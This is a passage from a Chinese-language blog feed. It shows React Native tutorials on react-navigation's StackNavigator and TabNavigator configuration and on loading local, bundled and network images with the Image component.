class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明：</p><p>如果导航栏上的的按钮点击是需要调用本类方法时不能直接this.jumpToRule()，需要在声明周期的componentDidMount中通过navigation中的setParams把函数注册到导航器中</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">componentDidMount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>navigation<span class="token punctuation">.</span><span class="token function">setParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span> jumpToRule<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>jumpToRule <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="goBack-返回-回退"><a href="#goBack-返回-回退" class="headerlink" title="goBack - 返回 回退"></a>goBack - 返回 回退</h5><p>可以不传，也可以传参数，还可以传 null</p><p>this.props.navigation.goBack(); // 回退到上一个页面 </p><p>this.props.navigation.goBack(null); // 回退到任意一个页面 </p><p>this.props.navigation.goBack(‘Home’); // 回退到Home页面 </p><p>dispatch - 发送一个action</p><h3 id="3-2、TabNavigator"><a href="#3-2、TabNavigator" class="headerlink" title="3.2、TabNavigator"></a>3.2、TabNavigator</h3><p>组件采用堆栈式的页面导航来实现各个界面跳转。它的构造函数：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token function">TabNavigator</span><span class="token punctuation">(</span>RouteConfigs<span class="token punctuation">,</span> TabNavigatorConfig<span class="token punctuation">)</span>RouteConfigs：页面tab配置TabNavigatorConfig：参数配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-2-1、参数配置"><a href="#3-2-1、参数配置" class="headerlink" title="3.2.1、参数配置"></a>3.2.1、参数配置</h4><pre class="line-numbers language-js"><code class="language-js">screen：和导航的功能是一样的，对应界面名称，可以在其他页面通过这个screen传值和跳转。  navigationOptions：配置TabNavigator的一些属性  title：标题，会同时设置导航条和标签栏的title  <span class="token function">tabBarVisible：是否隐藏标签栏。默认不隐藏</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>  tabBarIcon：设置标签栏的图标。需要给每个都设置  tabBarLabel：设置标签栏的title。推荐  导航栏配置  tabBarPosition：设置tabbar的位置，iOS默认在底部，安卓默认在顶部。（属性值：<span class="token string">'top'</span>，<span class="token string">'bottom'</span>）  swipeEnabled：是否允许在标签之间进行滑动  animationEnabled：是否在更改标签时显示动画  lazy：是否根据需要懒惰呈现标签，而不是提前，意思是在app打开的时候将底部标签栏全部加载，默认<span class="token boolean">false</span><span class="token punctuation">,</span>推荐为<span class="token boolean">true</span>  trueinitialRouteName： 设置默认的页面组件  backBehavior：按 back <span class="token function">键是否跳转到第一个Tab</span><span class="token punctuation">(</span>首页<span class="token punctuation">)</span>， none 为不跳转  tabBarOptions：配置标签栏的一些属性iOS属性  activeTintColor：label和icon的前景色 活跃状态下  activeBackgroundColor：label和icon的背景色 活跃状态下  inactiveTintColor：label和icon的前景色 不活跃状态下  inactiveBackgroundColor：label和icon的背景色 不活跃状态下  showLabel：是否显示label，默认开启 style：tabbar的样式  labelStyle：label的样式安卓属性  activeTintColor：label和icon的前景色 活跃状态下  inactiveTintColor：label和icon的前景色 不活跃状态下  showIcon：是否显示图标，默认关闭  showLabel：是否显示label，默认开启 style：tabbar的样式  labelStyle：label的样式 upperCaseLabel：是否使标签大写，默认为<span class="token boolean">true</span>  pressColor：material涟漪效果的颜色（安卓版本需要大于<span class="token number">5.0</span>）  pressOpacity：按压标签的透明度变化（安卓版本需要小于<span class="token number">5.0</span>）  scrollEnabled：是否启用可滚动选项卡 tabStyle：tab的样式  indicatorStyle：标签指示器的样式对象（选项卡底部的行）。安卓底部会多出一条线，可以将height设置为<span class="token number">0</span>来暂时解决这个问题  labelStyle：label的样式  iconStyle：图标样式  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>导入必要组件：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> TabNavigator <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react-navigation"</span><span class="token punctuation">;</span><span class="token keyword">import</span> Home <span class="token keyword">from</span> <span class="token string">"./category/Home"</span><span class="token punctuation">;</span><span class="token keyword">import</span> Feedback <span class="token keyword">from</span> <span class="token string">"./category/feedback/feedback"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>定义TabNavigator：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> MyTab <span class="token operator">=</span> <span class="token function">TabNavigator</span><span class="token punctuation">(</span>    <span class="token punctuation">{</span>        Home<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Home<span class="token punctuation">,</span>            navigationOptions<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> navigation <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>                headerTitle<span class="token punctuation">:</span> <span class="token string">"首页"</span><span class="token punctuation">,</span>                tabBarLabel<span class="token punctuation">:</span> <span class="token string">"首页"</span><span class="token punctuation">,</span>                headerBackTitle<span class="token punctuation">:</span> <span class="token keyword">null</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Feed<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Feedback<span class="token punctuation">,</span>            navigationOptions<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> navigation <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>                headerTitle<span class="token punctuation">:</span> <span class="token string">"意见反馈"</span><span class="token punctuation">,</span>                tabBarLabel<span class="token punctuation">:</span> <span class="token string">"我的"</span><span class="token punctuation">,</span>                headerBackTitle<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        tabBarComponent<span class="token punctuation">:</span> TabBarBottom<span class="token punctuation">,</span>        tabBarPosition<span class="token punctuation">:</span> <span class="token string">"bottom"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//设置tabbar的位置，iOS默认在底部，安卓默认在顶部。（属性值：'top'，'bottom'）</span>        swipeEnabled<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否允许在标签之间滑动</span>        animationEnabled<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否在更改标签时显示动画</span>        lazy<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否根据需要懒惰呈现标签，而不是提前制作，意思是在app打开的时候将底部标签栏全部加载，默认false,推荐改成true</span>        tabBarOptions<span class="token punctuation">:</span> <span class="token punctuation">{</span>            activeTintColor<span class="token punctuation">:</span> <span class="token string">"#ff552e"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//label和icon的前景色 活跃状态下（选中）</span>            <span class="token comment" spellcheck="true">// activeBackgroundColor:'blue',//label和icon的背景色 活跃状态下</span>            inactiveTintColor<span class="token punctuation">:</span> <span class="token string">"#333"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//label和icon的前景色 不活跃状态下</span>            showLabel<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否显示label，默认开启</span>            showIcon<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// android 默认不显示 icon, 需要设置为 true 才会显示</span>            style<span class="token punctuation">:</span> <span class="token punctuation">{</span> backgroundColor<span class="token punctuation">:</span> <span class="token string">"#ffffff"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//tabbar的样式</span>            labelStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                fontSize<span class="token punctuation">:</span> <span class="token number">14</span> <span class="token comment" spellcheck="true">// 文字大小</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-3、页面导航和页面切换混合使用"><a href="#3-3、页面导航和页面切换混合使用" class="headerlink" title="3.3、页面导航和页面切换混合使用"></a>3.3、页面导航和页面切换混合使用</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">const</span> MyTab <span class="token operator">=</span> <span class="token function">TabNavigator</span><span class="token punctuation">(</span>    <span class="token punctuation">{</span>        Home<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Home<span class="token punctuation">,</span>            navigationOptions<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> navigation <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>                headerTitle<span class="token punctuation">:</span> <span class="token string">"首页"</span><span class="token punctuation">,</span>                tabBarLabel<span class="token punctuation">:</span> <span class="token string">"首页"</span><span class="token punctuation">,</span>                headerBackTitle<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                tabBarIcon<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> tintColor <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>                    <span class="token operator">&lt;</span>Image                        style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>imageStyle<span class="token punctuation">}</span>                        source<span class="token operator">=</span><span class="token punctuation">{</span>                            tintColor <span class="token operator">==</span> <span class="token string">"#ff552e"</span>                                <span class="token operator">?</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./img/yingxiao/ac-jingxuan.png"</span><span class="token punctuation">)</span>                                <span class="token punctuation">:</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./img/yingxiao/jingxuan.png"</span><span class="token punctuation">)</span>                        <span class="token punctuation">}</span>                    <span class="token operator">/</span><span class="token operator">></span>                <span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Feed<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Feedback<span class="token punctuation">,</span>            navigationOptions<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> navigation <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">{</span>                headerTitle<span class="token punctuation">:</span> <span class="token string">"意见反馈"</span><span class="token punctuation">,</span>                tabBarLabel<span class="token punctuation">:</span> <span class="token string">"我的"</span><span class="token punctuation">,</span>                headerBackTitle<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>                headerRight<span class="token punctuation">:</span> <span class="token punctuation">(</span>                    <span class="token operator">&lt;</span>Text                        style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> color<span class="token punctuation">:</span> <span class="token string">"#333"</span><span class="token punctuation">,</span> marginRight<span class="token punctuation">:</span> <span class="token number">14</span><span class="token punctuation">,</span> fontSize<span class="token punctuation">:</span> <span class="token number">16</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>                        onPress<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span>                            navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params <span class="token operator">?</span> navigation<span class="token punctuation">.</span>state<span class="token punctuation">.</span>params<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">null</span>                        <span class="token punctuation">}</span><span class="token operator">></span>                        提交                    <span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                tabBarIcon<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> tintColor <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">(</span>                    <span class="token operator">&lt;</span>Image                        style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>imageStyle<span class="token punctuation">}</span>                        source<span class="token operator">=</span><span class="token punctuation">{</span>                            tintColor <span class="token operator">==</span> <span class="token string">"#ff552e"</span>                                <span class="token operator">?</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./img/yingxiao/ac-laidiantong.png"</span><span class="token punctuation">)</span>                                <span class="token punctuation">:</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./img/yingxiao/laidiantong.png"</span><span class="token punctuation">)</span>                        <span class="token punctuation">}</span>                    <span class="token operator">/</span><span class="token operator">></span>                <span class="token punctuation">)</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        tabBarComponent<span class="token punctuation">:</span> TabBarBottom<span class="token punctuation">,</span>        tabBarPosition<span class="token punctuation">:</span> <span class="token string">"bottom"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//设置tabbar的位置，iOS默认在底部，安卓默认在顶部。（属性值：'top'，'bottom'）</span>        swipeEnabled<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否允许在标签之间滑动</span>        animationEnabled<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否在更改标签时显示动画</span>        lazy<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否根据需要懒惰呈现标签，而不是提前制作，意思是在app打开的时候将底部标签栏全部加载，默认false,推荐改成true</span>        tabBarOptions<span class="token punctuation">:</span> <span class="token punctuation">{</span>            activeTintColor<span class="token punctuation">:</span> <span class="token string">"#ff552e"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//label和icon的前景色 活跃状态下（选中）</span>            <span class="token comment" spellcheck="true">// activeBackgroundColor:'blue',//label和icon的背景色 活跃状态下</span>            inactiveTintColor<span class="token punctuation">:</span> <span class="token string">"#333"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//label和icon的前景色 不活跃状态下</span>            showLabel<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//是否显示label，默认开启</span>            showIcon<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// android 默认不显示 icon, 需要设置为 true 才会显示</span>            style<span class="token punctuation">:</span> <span class="token punctuation">{</span> backgroundColor<span class="token punctuation">:</span> <span class="token string">"#ffffff"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">//tabbar的样式</span>            labelStyle<span class="token punctuation">:</span> <span class="token punctuation">{</span>                fontSize<span class="token punctuation">:</span> <span class="token number">14</span> <span class="token comment" spellcheck="true">// 文字大小</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> AppIndex <span class="token operator">=</span> <span class="token function">StackNavigator</span><span class="token punctuation">(</span>    <span class="token punctuation">{</span>        Main<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> MyTab        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Task<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Task        <span class="token punctuation">}</span><span class="token punctuation">,</span>        NewTask<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> NewTask        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Redeem<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Redeem        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Rule<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Rule        <span class="token punctuation">}</span><span class="token punctuation">,</span>        Test<span class="token punctuation">:</span> <span class="token punctuation">{</span>            screen<span class="token punctuation">:</span> Test        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span>        initialRouteName<span class="token punctuation">:</span> <span class="token string">"Task"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 默认显示界面</span>        navigationOptions<span class="token punctuation">:</span> <span class="token punctuation">{</span>            headerTitle<span class="token punctuation">:</span> <span class="token string">"每日任务"</span><span class="token punctuation">,</span>            headerBackTitle<span class="token punctuation">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>            <span class="token comment" spellcheck="true">// headerBackTitle: "返回",</span>            headerTintColor<span class="token punctuation">:</span> <span class="token string">"#333"</span><span class="token punctuation">,</span>            cardStack<span class="token punctuation">:</span> <span class="token punctuation">{</span>                gesturesEnabled<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">//是否允许右滑返回，在iOS上默认为true，在Android上默认为false</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token comment" spellcheck="true">// mode: "card", // 页面切换模式, 左右是card(相当于iOS中的push效果), 上下是modal(相当于iOS中的modal效果)</span>        headerMode<span class="token punctuation">:</span> <span class="token string">"screen"</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 导航栏的显示模式, screen: 有渐变透明效果, float: 无透明效果, none: 隐藏导航栏</span>        onTransitionStart<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 回调</span>        onTransitionEnd<span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 回调</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ReactNative </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ReactNative </tag>
            
            <tag> Router </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RN Image和ImageBackground</title>
      <link href="2018/04/16/rnimage/"/>
      <url>2018/04/16/rnimage/</url>
      
        <content type="html"><![CDATA[<h2 id="Image组件的基本用法"><a href="#Image组件的基本用法" class="headerlink" title="Image组件的基本用法"></a>Image组件的基本用法</h2><h3 id="从当前项目中加载图片"><a href="#从当前项目中加载图片" class="headerlink" title="从当前项目中加载图片"></a>从当前项目中加载图片</h3><p>要往App中添加一个静态图片，只需把图片文件放在代码文件夹中某处，然后像下面这样去引用它：</p><p>&lt;Image source={require(‘./my-icon.png’)} /&gt;  即:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>View style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>container<span class="token punctuation">}</span><span class="token operator">></span>    <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/*从项目中加载图片*/</span><span class="token punctuation">}</span>    <span class="token operator">&lt;</span>Text<span class="token operator">></span>从项目中加载图片<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span>    <span class="token comment" spellcheck="true">// 在imageStyle中指定宽高</span>    <span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./img/icon.png'</span><span class="token punctuation">)</span><span class="token punctuation">}</span> style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>imageStyle<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>View<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该图片资源文件的查找和JS模块相似，该会根据填写的图片路径相对于当前的js文件路径进行搜索。</p><p> 此外，React Naive的Packager会根据平台选择相应的文件，例如:my_icon.ios.png和my_icon.android.png两个文件(命名方式android或者ios)，会分别根据android或者ios平台选择相应的文件。</p><p>你还可以使用@2x，@3x这样的文件名后缀，来为不同的屏幕精度提供图片。比如下面这样的代码结构：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">.</span>├── button<span class="token punctuation">.</span>js└── img    ├── check@2x<span class="token punctuation">.</span>png    └── check@3x<span class="token punctuation">.</span>png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并且button.js里有这样的代码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./img/check.png'</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Packager会打包所有的图片并且依据屏幕精度提供对应的资源。譬如说，iPhone 5s会使用<a href="mailto:check@2x.png" target="_blank" rel="noopener">check@2x.png</a>，而Nexus 5上则会使用<a href="mailto:check@3x.png" target="_blank" rel="noopener">check@3x.png</a>。如果没有图片恰好满足屏幕分辨率，则会自动选中最接近的一个图片。<br>注意：如果你添加图片的时候packager正在运行，可能需要重启packager以便能正确引入新添加的图片。</p><p>这样会带来如下的一些好处:</p><p>iOS和Android一致的文件系统。 图片和JS代码处在相同的文件夹，这样组件就可以包含自己所用的图片而不用单独去设置。 不需要全局命名。你不用再担心图片名字的冲突问题了。 只有实际被用到（即被require）的图片才会被打包到你的app。 现在在开发期间，增加和修改图片不需要重新编译了，只要和修改js代码一样刷新你的模拟器就可以了。 与访问网络图片相比，Packager可以得知图片大小了，不需要在代码里再声明一遍尺寸。现在通过npm来分发组件或库可以包含图片了。</p><p>另一种写法:</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 错误</span><span class="token keyword">let</span> icon <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>active <span class="token operator">?</span> <span class="token string">'my-icon-active'</span> <span class="token punctuation">:</span> <span class="token string">'my-icon-inactive'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./'</span> <span class="token operator">+</span> icon <span class="token operator">+</span> <span class="token string">'.png'</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token comment" spellcheck="true">// 正确</span><span class="token keyword">let</span> icon <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>props<span class="token punctuation">.</span>active <span class="token operator">?</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./my-icon-active.png'</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./my-icon-inactive.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span>icon<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="加载使用APP中的图片"><a href="#加载使用APP中的图片" class="headerlink" title="加载使用APP中的图片"></a>加载使用APP中的图片</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>uri<span class="token punctuation">:</span> <span class="token string">'app_icon'</span><span class="token punctuation">}</span><span class="token punctuation">}</span> style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>width<span class="token punctuation">:</span> <span class="token number">40</span><span class="token punctuation">,</span> height<span class="token punctuation">:</span> <span class="token number">40</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">/*从资源包中加载图片*/</span><span class="token punctuation">}</span> <span class="token operator">&lt;</span>Text<span class="token operator">></span><span class="token number">2</span><span class="token punctuation">.</span>从APP中加载图片<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span> <span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>uri<span class="token punctuation">:</span><span class="token string">'icon_a'</span><span class="token punctuation">}</span><span class="token punctuation">}</span> style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>imageStyle<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用已经打包在APP中的图片资源(例如:xcode asset文件夹以及Android drawable文件夹)</p><p>注意：这一做法并没有任何安全检查。你需要自己确保图片在应用中确实存在，而且还需要指定尺寸。</p><h3 id="加载来自网络的图片"><a href="#加载来自网络的图片" class="headerlink" title="加载来自网络的图片"></a>加载来自网络的图片</h3><p>客户端的很多图片资源基本上都是实时通过网络进行获取的，写法和上面的加载本地资源图片的方式不太一样，这边一定需要指定图片的尺寸大小，实现如下</p><pre class="line-numbers language-js"><code class="language-js"><span class="token punctuation">{</span><span class="token comment" spellcheck="true">/*从网络中加载图片*/</span><span class="token punctuation">}</span> <span class="token operator">&lt;</span>Text<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">.</span>从网络中加载图片<span class="token operator">&lt;</span><span class="token operator">/</span>Text<span class="token operator">></span> <span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>uri<span class="token punctuation">:</span> <span class="token string">'https://upload.wikimedia.org/wikipedia/commons/d/de/Bananavarieties.jpg'</span><span class="token punctuation">}</span><span class="token punctuation">}</span>        style<span class="token operator">=</span><span class="token punctuation">{</span>styles<span class="token punctuation">.</span>imageStyle<span class="token punctuation">}</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/16040996-584e9219a67633ed.gif?imageMogr2/auto-orient/strip" alt="image.gif"> </p><h3 id="设置图片为背景"><a href="#设置图片为背景" class="headerlink" title="设置图片为背景"></a>设置图片为背景</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>Image source<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>uri<span class="token punctuation">:</span>'https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>upload<span class="token punctuation">.</span>wikimedia<span class="token punctuation">.</span>org<span class="token operator">/</span>wikipedia<span class="token operator">/</span>commons<span class="token 